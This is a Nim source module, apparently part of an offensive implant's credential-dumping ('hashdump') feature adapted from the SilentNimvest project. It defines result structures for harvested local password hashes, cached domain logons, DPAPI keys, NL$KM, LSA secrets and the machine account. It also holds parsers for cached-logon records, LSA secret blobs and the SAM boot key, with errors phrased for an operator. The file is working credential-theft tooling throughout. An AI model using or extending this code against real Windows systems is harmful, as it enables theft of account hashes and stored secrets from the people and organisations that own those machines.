# Taken from the excellent SilentNimvest project by @frkngksl (MIT)
# Source: https://github.com/frkngksl/SilentNimvest

import winim/lean
import std/[json, strutils]

const
  MaxSecretBlobLen* = 1_048_576

type
  HashdumpHarvestError* = object of CatchableError
    operatorMessage*: string
    debugDetail*: string

  PhaseResult* = object
    dataProduced*: bool
    failed*: bool
    operatorMessage*: string
    warning*: string

  HashdumpResult* = object
    local_users*: seq[JsonNode]
    cached_logons*: seq[JsonNode]
    dpapi_machine_key*: string
    dpapi_user_key*: string
    nlkm*: string
    lsa_secrets*: seq[JsonNode]
    machine_account*: string

proc newHashdumpHarvestError*(operatorMessage, debugDetail: string): ref HashdumpHarvestError =
  result = new(HashdumpHarvestError)
  result.msg = operatorMessage
  result.operatorMessage = operatorMessage
  result.debugDetail = debugDetail

proc initHashdumpResult*(): HashdumpResult =
  HashdumpResult()

proc hashdumpResultToJson*(r: HashdumpResult; status: string = "completed"; warnings: seq[string] = @[]): JsonNode =
  %*{
    "_status": status,
    "_warnings": warnings,
    "_summary": {
      "local_user_count": r.local_users.len,
      "cached_logon_count": r.cached_logons.len,
      "lsa_secret_count": r.lsa_secrets.len,
      "has_machine_account": r.machine_account.len > 0,
      "has_dpapi": r.dpapi_machine_key.len > 0 or r.dpapi_user_key.len > 0,
    },
    "local_users": r.local_users,
    "cached_logons": r.cached_logons,
    "dpapi": {"machine_key": r.dpapi_machine_key, "user_key": r.dpapi_user_key},
    "nlkm": r.nlkm,
    "lsa_secrets": r.lsa_secrets,
    "machine_account": r.machine_account,
  }

type
    KEY_INFORMATION_CLASS* = enum

        KeyBasicInformation, # KEY_BASIC_INFORMATION
        KeyNodeInformation, # KEY_NODE_INFORMATION
        KeyFullInformation, # KEY_FULL_INFORMATION
        KeyNameInformation, # KEY_NAME_INFORMATION
        KeyCachedInformation, # KEY_CACHED_INFORMATION
        KeyFlagsInformation, # KEY_FLAGS_INFORMATION
        KeyVirtualizationInformation, # KEY_VIRTUALIZATION_INFORMATION
        KeyHandleTagsInformation, # KEY_HANDLE_TAGS_INFORMATION
        KeyTrustInformation, # KEY_TRUST_INFORMATION
        KeyLayerInformation, # KEY_LAYER_INFORMATION
        MaxKeyInfoClass

    KEY_VALUE_INFORMATION_CLASS* = enum
        KeyValueBasicInformation,
        KeyValueFullInformation,
        KeyValuePartialInformation

    KEY_NODE_INFORMATION_STRUCT* {.bycopy.} = object
        LastWriteTime*: LARGE_INTEGER
        TitleIndex*:    ULONG
        ClassOffset*:   ULONG
        ClassLength*:   ULONG
        NameLength*:    ULONG
        Name*:          array[1, WCHAR]

    KEY_VALUE_BASIC_INFORMATION_STRUCT* {.bycopy.} = object
        TitleIndex*: ULONG
        Type*: ULONG
        NameLength*: ULONG
        Name*: array[1, WCHAR]


    PKEY_NODE_INFORMATION* = ptr KEY_NODE_INFORMATION_STRUCT

    KEY_BASIC_INFORMATION_STRUCT* {.pure.} = object
        LastWriteTime*: LARGE_INTEGER
        TitleIndex*:    ULONG
        NameLength*:    ULONG
        Name*:          array[1, WCHAR]

    PKEY_BASIC_INFORMATION* = ptr KEY_BASIC_INFORMATION_STRUCT

    NlRecord* = object
        UserLength*:      int16
        DomainNameLength*: int16
        DnsDomainLength*: int16
        Iv*:              seq[byte]
        EncryptedData*:   seq[byte]

    LsaSecretBlob* = object
        Length*: uint32
        Unk*: seq[byte]
        Secret*: seq[byte]
        SecretString*:wstring

proc InitNlRecord*(data: seq[byte]): NlRecord =
  if data.len < 96:
    raise newHashdumpHarvestError("Security harvest failed", "hashdump harvest failed: NL record too short (len=" & $data.len & ")")
  result.UserLength      = cast[int16]([data[0], data[1]])
  result.DomainNameLength = cast[int16]([data[2], data[3]])
  result.DnsDomainLength  = cast[int16]([data[60], data[61]])
  result.Iv              = data[64 ..< 64+16]
  result.EncryptedData   = data[96 ..< data.len]

proc NewLsaSecretBlob*(inputData: seq[byte]): LsaSecretBlob =
  result = LsaSecretBlob(Length: 0, Unk: @[], Secret: @[], SecretString: newWString(0))
  if inputData.len < 16:
    return result
  let declaredLen = (cast[ptr uint32](unsafeAddr inputData[0]))[]
  if declaredLen <= 0:
    return result
  let cappedLen = min(min(int(declaredLen), inputData.len - 16), MaxSecretBlobLen)
  if cappedLen <= 0:
    return result
  result.Length = uint32(cappedLen)
  result.Unk = inputData[4 ..< 16]
  result.Secret = inputData[16 ..< 16 + cappedLen]
  var index = 0
  while index < result.Secret.len:
    result.SecretString.add(cast[WCHAR](result.Secret[index]))
    index = index + 2

proc SeqToUnicode*(input: seq[byte]): string =
  var index = 0
  var returnValue = newWString(0)
  while index < input.len:
    returnValue.add(cast[WCHAR](input[index]))
    index += 2
  return $returnValue

proc wcharsToString*(pName: ptr UncheckedArray[WCHAR], nameLenBytes: ULONG): string =
  var w = newWString(0)
  let charCount = nameLenBytes div cast[ULONG](sizeof(WCHAR))
  for i in 0 ..< charCount.int:
    w.add(pName[i])
  return $w

proc isHexPair*(s: string): bool =
  if s.len != 2:
    return false
  for ch in s:
    if ch notin {'0'..'9', 'a'..'f', 'A'..'F'}:
      return false
  true

proc hexStringToByteArray*(s: string): seq[byte] =
  if s.len mod 2 != 0:
    raise newHashdumpHarvestError("SAM harvest failed", "hashdump harvest failed: boot key class length not hex-aligned")
  result = newSeq[byte](s.len div 2)
  var i = 0
  var outIdx = 0
  while i < s.len:
    let pair = s[i .. i+1]
    if not isHexPair(pair):
      raise newHashdumpHarvestError("SAM harvest failed", "hashdump harvest failed: boot key class contains non-hex data")
    result[outIdx] = parseHexInt(pair).byte
    i += 2
    inc outIdx
